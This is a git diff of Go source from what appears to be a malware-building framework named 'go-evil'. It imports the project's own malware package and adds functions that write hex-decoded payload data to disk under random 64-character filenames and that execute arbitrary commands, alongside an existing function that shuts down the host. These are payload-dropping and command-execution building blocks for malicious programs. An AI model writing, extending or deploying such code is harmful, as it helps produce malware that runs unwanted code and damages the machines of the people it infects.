@@ -2,6 +2,7 @@ package domains
 
 import (
 	"bufio"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
@@ -9,12 +10,21 @@ import (
 	"runtime"
 	"strings"
 
+	malware "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/utility/contains"
 	"github.com/s9rA16Bf4/go-evil/utility/converter"
 	"github.com/s9rA16Bf4/go-evil/utility/io"
 	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 	"gopkg.in/go-rillas/subprocess.v1"
 )
+
+type system_t struct {
+	file_name        string
+	output_directory string // Where should the output be placed. Only used when creating a file currently
+}
+
+var c_system system_t
 
 func Exit(status_lvl string) {
 	status_lvl = run_time.Check_if_variable(status_lvl)
@@ -131,4 +141,52 @@ func Shutdown() {
 	} else if runtime.GOOS == "windows" {
 		io.Run_file("shutdown /s")
 	}
+}
+
+func CreateFile(content string) {
+	content = run_time.Check_if_variable(content)
+
+	if c_system.file_name == "" {
+		Set_filename(malware.Generate_random_name(64))
+	}
+	if c_system.output_directory == "" {
+		Set_output("./")
+	}
+
+	file, err := os.Create(c_system.output_directory + c_system.file_name)
+	if err != nil {
+		notify.Error(err.Error(), "system.CreateFile()")
+		return
+	}
+
+	_, err = hex.DecodeString(content)
+	if err == nil { // Its a text
+		file.WriteString(content)
+	} else {
+		splitted_data := strings.Split(content, "\n")
+		for _, read_data := range splitted_data {
+			data, _ := hex.DecodeString(read_data)
+			file.Write(data)
+		}
+	}
+
+	file.Close()
+	run_time.Set_variable(c_system.file_name) // Filename
+}
+
+func RunCommand(command string) {
+	command = run_time.Check_if_variable(command)
+	resp := io.Run_file(command)
+	run_time.Set_variable(resp)
+}
+
+func Set_filename(new_file_name string) {
+	c_system.file_name = new_file_name
+}
+
+func Set_output(new_dir string) {
+	if !contains.EndsWith(new_dir, []string{"/"}) {
+		new_dir += "/"
+	}
+	c_system.output_directory = new_dir
 }
